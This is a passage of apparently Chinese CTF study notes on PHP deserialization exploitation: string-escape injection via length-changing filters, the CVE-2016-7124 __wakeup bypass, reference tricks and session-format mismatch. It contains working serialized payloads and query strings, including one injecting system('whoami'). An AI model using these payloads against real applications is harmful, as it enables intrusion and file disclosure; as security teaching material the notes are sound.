</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system()&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$data</span>);<span class="comment">//出现system()就删掉  </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));<span class="comment">//得到abc  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="字符串逃逸-增多"><a href="#字符串逃逸-增多" class="headerlink" title="字符串逃逸-增多"></a>字符串逃逸-增多</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086955-7d379073-bdb0-4494-a9d7-94a2eb44535b.jpg" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087047-974fcf1e-5bff-48db-b930-9552d930e0ce.jpg" alt="null"></p><p>22个ls占44<br>22个pwd占66</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lslslslslslslslslslslslslslslslslslslslslsls<span class="string">&quot;;s:2:&quot;</span>v3<span class="string">&quot;;s:3:&quot;</span><span class="number">666</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087130-77b11671-61ba-4817-9e03-9f0b1da18b9a.jpg" alt="null"></p><p>字符串逃逸成代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">判断pass==&#x27;escaping&#x27;</span><br></pre></td></tr></table></figure><h2 id="字符串逃逸增加例题"><a href="#字符串逃逸增加例题" class="headerlink" title="字符串逃逸增加例题"></a>字符串逃逸增加例题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);  </span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;<span class="comment">//需要返回escaping  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];  </span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));<span class="comment">//new test($param)触发contruct，wakeup  </span></span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));<span class="comment">//过滤flag和php，然后反序列化  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">用户输入(GET param) </span><br><span class="line">→ 传入test类的构造方法，实例化test对象 </span><br><span class="line">→ 序列化该test对象（得到含默认pass=daydream的序列化字符串）</span><br><span class="line">→ filter函数过滤序列化字符串（替换flag/php为hack）</span><br><span class="line">→ 反序列化过滤后的字符串（得到<span class="variable">$profile</span>对象）</span><br><span class="line">→ 检查<span class="variable">$profile</span>-&gt;pass是否等于<span class="string">&#x27;escaping&#x27;</span> → 满足则读取flag.php</span><br></pre></td></tr></table></figure><p>怎么判断是增加的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">从php到hack是增加的，所以是增加的</span><br><span class="line">&lt;?php  </span><br><span class="line">class test&#123;  </span><br><span class="line">    var $user=&#x27;benben&#x27;;  </span><br><span class="line">    var $pass=&#x27;escaping&#x27;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">echo serialize(new test());  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:4:&quot;hack&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure><p>然后构造逃逸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:4:&quot;hack&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure><p>要逃逸escaping<br>目标逃逸代码<br>php被替换成hack<br>需要吐出27个字符，然后需要补全结构，所以需要吐出29个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure><p>写29个php<br>为什么，一个php吐出一个字符，要29个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=<span class="string">&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;escaping&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>查看源码得到flag</p><h2 id="字符串逃逸减少例题"><a href="#字符串逃逸减少例题" class="headerlink" title="字符串逃逸减少例题"></a>字符串逃逸减少例题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">写题流程</span><br><span class="line"><span class="number">1</span>.字符串过滤后是减少还是增多</span><br><span class="line">    flag，php明显比hk长所以是减少</span><br><span class="line"><span class="number">2</span>.构造关键成员属性序列化字符串</span><br><span class="line">    <span class="variable">$vip</span>=<span class="literal">true</span></span><br><span class="line"><span class="number">3</span>.变少则判断吃掉的内容，并计算长度</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&quot;flag&quot;</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;benben&quot;</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>构造减少字符串逃逸</p><p>保留</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure><p>最终逃逸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:3:&quot;vip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure><p>要算吃掉那一部分</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087203-6586bb15-6e73-4f78-a715-178410604293.jpg" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087269-1d51518b-1fb5-4189-865e-d2084202ae38.jpg" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="string">&#x27;flagflagflagflagflagflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="weakup魔术方法绕过"><a href="#weakup魔术方法绕过" class="headerlink" title="weakup魔术方法绕过"></a>weakup魔术方法绕过</h2><p>一般不单独出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()</span><br></pre></td></tr></table></figure><p><strong>CVE-2016-7124</strong><br>反序列化</p><p>当序列化字符串中声明的属性数量大于实际实际类中定义的属性数量多时，<code>__wakeup()</code>方法会被跳过。<br>PHP5&lt;5.6.25<br>PHP7&lt;7.0.10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;        <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;index.php&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>&#123;        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//sercet in flag.php  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087337-a2b84a3f-f748-4bea-b6d8-a52fceace65f.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">O:+6:&quot;sercet&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">class secret</span><br><span class="line">&#123;</span><br><span class="line">    var $file = &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//echo serialize(new secret());</span><br><span class="line">//O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">$a=&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;;</span><br><span class="line">echo urlencode($a);</span><br></pre></td></tr></table></figure><p>不显示flag<br>我还以为我脚本写错</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pass&#x27;])) &#123;</span><br><span class="line">    $pass = $_GET[&#x27;pass&#x27;];</span><br><span class="line">    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">if ($o) &#123;</span><br><span class="line">    $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">    if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">        echo &quot;Congratulation! Here is my secret: &quot;.$flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Oh no... You can&#x27;t fool me&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else echo &quot;are you trolling?&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">Congratulation! Here is my secret: ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">just4fun</span>();  </span><br><span class="line"><span class="variable">$a</span> -&gt;enter = &amp;<span class="variable">$a</span> -&gt;secret;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;just4fun&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;enter&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;secret&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>R代表引用，2代表enter<br><strong>类似一个快捷方式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pass=O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><p>当seesion_start()被调用或者php.ini中session.auto_start为1时<br>PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp)。</p><p>存取数据的格式有多种，常用的有三种<br>漏洞的产生：写入和读取的格式不一样</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087416-149aa69f-42a7-4292-a241-ccb50af7b861.jpg" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087489-9bd6fa08-9323-491f-bea4-246e944fe4e1.jpg" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benben|s:<span class="number">6</span>:<span class="string">&quot;1234565&quot;</span>;</span><br></pre></td></tr></table></figure><p>php_serialize序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>漏洞是怎么来的?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只要有一个类为D</span><br></pre></td></tr></table></figure><p>它的值就可以为序列化</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087599-bc7229c0-92ba-4461-9eab-8df24ef1b196.jpg" alt="null"></p><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>=<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">D</span>());  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">/class20/save.php?a=|O:<span class="number">1</span>:<span class="string">&quot;D&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;system(%27whoami%27);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后直接到vul.php刷新就能看到执行命令了</p><h2 id="session例题"><a href="#session例题" class="headerlink" title="session例题"></a>session例题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    